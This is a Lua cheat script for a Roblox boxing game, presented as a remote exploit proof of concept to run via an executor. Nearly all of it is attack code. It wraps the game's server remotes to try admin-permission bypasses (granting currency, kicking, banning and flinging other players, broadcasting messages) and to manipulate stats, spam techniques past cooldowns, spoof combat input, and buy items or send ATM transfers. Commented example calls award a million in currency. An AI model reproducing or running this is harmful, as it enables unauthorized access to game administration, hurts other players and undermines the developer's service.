--[[
Hajime Rising [ALPHA] — Remote Exploit PoC
WARNING: This dump has NO ServerScriptService. Every FireServer/InvokeServer below
is UNCONFIRMED — it only works if the server fails to validate caller permission,
cash, cooldowns, ownership, or hit validation.

Run as a LocalScript or via executor while in-game.
--]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Boxing = ReplicatedStorage:WaitForChild("Boxing")

-- Cache remotes
local REM = {
    Boxing       = Boxing:WaitForChild("BoxingRemote"),
    Sparring     = Boxing:WaitForChild("SparringRemote"),
    Visibility   = Boxing:WaitForChild("VisibilityRemote"),
    Avatar       = Boxing:WaitForChild("AvatarRemote"),
    Survival     = Boxing:WaitForChild("SurvivalRemote"),
    Stats        = Boxing:WaitForChild("StatsRemote"),
    Roadwork     = Boxing:WaitForChild("RoadworkRemote"),
    Gear         = Boxing:WaitForChild("GearRemote"),
    Loadout      = Boxing:WaitForChild("LoadoutRemote"),
    Technique    = Boxing:WaitForChild("TechniqueRemote"),
    License      = Boxing:WaitForChild("LicenseRemote"),
    AdminPanel   = Boxing:WaitForChild("AdminPanelRemote"),
    Atm          = Boxing:WaitForChild("AtmRemote"),
}

local function fire(remote, op, ...)
    local r = REM[remote]
    if not r then warn("Missing remote:", remote); return end
    local ok, err = pcall(function() r:FireServer(op, ...) end)
    if ok then print(string.format("[OK] %s.%s(%s)", remote, op, table.pack(...):GetName and "" or tostring(...)))
    else warn(string.format("[ERR] %s.%s: %s", remote, op, tostring(err))) end
end

local function invoke(remote, op, ...)
    local r = REM[remote]
    if not r then warn("Missing remote:", remote); return end
    local ok, a, b = pcall(function() return r:InvokeServer(op, ...) end)
    print(string.format("[INVOKE] %s.%s -> ok=%s a=%s b=%s", remote, op, tostring(ok), tostring(a), tostring(b)))
    return ok, a, b
end

local H = {
    -- Admin permission bypass (UNCONFIRMED)
    adminGiveYen = function(userId, amount) invoke("AdminPanel", "GiveYen", userId, amount) end,
    adminGiveRerolls = function(userId, amount) invoke("AdminPanel", "GiveRerolls", userId, amount) end,
    adminFly = function(on) invoke("AdminPanel", "Fly", on) end,
    adminNoclip = function(on) invoke("AdminPanel", "Noclip", on) end,
    adminBTools = function(on) invoke("AdminPanel", "BTools", on) end,
    adminFling = function(userId) invoke("AdminPanel", "Fling", userId) end,
    adminKick = function(userId) invoke("AdminPanel", "Kick", userId) end,
    adminBan = function(userId, duration, reason) invoke("AdminPanel", "Ban", userId, duration, reason or "") end,
    adminStatEvent = function(on) invoke("AdminPanel", "StatEvent", on) end,
    adminServerMessage = function(text) invoke("AdminPanel", "ServerMessage", text) end,
    adminGlobalMessage = function(text) invoke("AdminPanel", "GlobalMessage", text) end,

    -- Stat manipulation (UNCONFIRMED)
    statsResetBuild = function() fire("Stats", "ResetBuild") end,
    statsLock = function(stat, index, locked) fire("Stats", "Lock", stat, index, locked) end,
    statsGoal = function(stat, index, value) fire("Stats", "Goal", stat, index, value) end,
    statsResetStat = function(stat) fire("Stats", "ResetStat", stat) end,

    -- Technique spam / cooldown bypass (client cooldowns are local-only)
    techniqueUse = function(technique, target) fire("Technique", "Use", technique, target) end,
    techniqueCancel = function(id) fire("Technique", "Cancel", id) end,
    techniqueCounterPick = function(kind) fire("Technique", "CounterPick", kind) end,
    stanceSwitch = function(stance) fire("Boxing", "Stance", stance) end,

    -- Combat input spoofing (UNCONFIRMED)
    combatPunch = function(zone, dir, pull, num) fire("Boxing", "Punch", zone, dir, pull, num) end,
    combatBlock = function(active, zone) fire("Boxing", "Block", active, zone) end,
    combatWeave = function(active) fire("Boxing", "Weave", active) end,
    combatFeint = function(dir) fire("Boxing", "Feint", dir) end,
    combatParry = function() fire("Boxing", "Parry") end,
    combatRun = function(running) fire("Boxing", "Run", running) end,

    -- Shop / items (UNCONFIRMED)
    shopBuy = function(itemId, name) fire("Survival", "Buy", itemId, name) end,
    survivalWear = function(kind, id) fire("Survival", "Wear", kind, id) end,
    gearBuy = function(itemId, colourId) invoke("Gear", "Buy", itemId, colourId) end,
    gearEquip = function(itemId, colourId) invoke("Gear", "Equip", itemId, colourId) end,
    loadoutEquip = function(slot, itemId) fire("Loadout", "Equip", slot, itemId) end,

    -- Avatar / reroll (UNCONFIRMED)
    avatarSetSkin = function(skin) fire("Avatar", "Set", "Skin", skin) end,
    avatarSetGender = function(gender) fire("Avatar", "Set", "Gender", gender) end,
    avatarReroll = function(what) fire("Avatar", "Reroll", what) end,
    avatarSave = function() fire("Avatar", "Save") end,

    -- ATM (UNCONFIRMED)
    atmState = function() return invoke("Atm", "State") end,
    atmSend = function(userId, amount) return invoke("Atm", "Send", userId, amount) end,

    -- Training (UNCONFIRMED)
    trainPress = function(repId, t) fire("Boxing", "TrainPress", repId, t) end,
    trainRelease = function(repId, t) fire("Boxing", "TrainRelease", repId, t) end,
    trainStop = function() fire("Boxing", "TrainStop") end,

    -- Sparring (low impact)
    sparringChoose = function(option) fire("Sparring", "Choose", option) end,
}

return H

-- Example usage (UNCOMMENT to run):
-- H.adminGiveYen(LocalPlayer.UserId, 1000000)
-- H.adminGiveRerolls(LocalPlayer.UserId, 100)
-- H.techniqueUse("Dempsey Roll", nil)
-- H.combatPunch("Right", Vector3.new(0,0,-1), 0.5, 1)
-- H.shopBuy("SomeItemId", "Item Name")
